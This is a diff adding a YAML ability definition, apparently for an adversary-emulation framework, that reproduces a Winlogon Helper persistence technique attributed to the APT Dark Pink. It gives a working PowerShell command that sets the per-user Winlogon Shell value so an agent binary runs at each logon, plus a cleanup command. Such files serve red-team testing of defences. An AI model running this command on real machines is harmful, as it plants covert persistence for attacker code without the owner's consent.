@@ -1,0 +1,45 @@
+- tactic: persistence
+  technique_name: 'Boot or Logon Autostart Execution: Winlogon Helper DLL'
+  technique_id: T1547.004
+  name: Winlogon HKCU Shell Key Agent Execution (New-ItemProperty)
+  description: This ability is derived from the APT Dark Pink.  Logon persistence
+    is achieved by using PowerShell's New-ItemProperty cmdlet to create a Shell value
+    under HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon key. The Shell
+    value is set to include both explorer.exe and the agent binary. This preserves
+    normal Windows shell functionality while ensuring the agent binary executes after
+    user logon.
+  executors:
+  - name: psh
+    platform: windows
+    command: '$newItemPropertySplat = @{ Path = "HKCU:\Software\Microsoft\Windows
+      NT\CurrentVersion\Winlogon";
+
+      Name = "Shell";
+
+      PropertyType = "String";
+
+      Value = "explorer.exe, #{location} -server #{server} -group #{group}" };
+
+      New-ItemProperty @newItemPropertySplat -force'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Force;
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: c3b08463-4ba1-426f-b5c8-813a20963f62
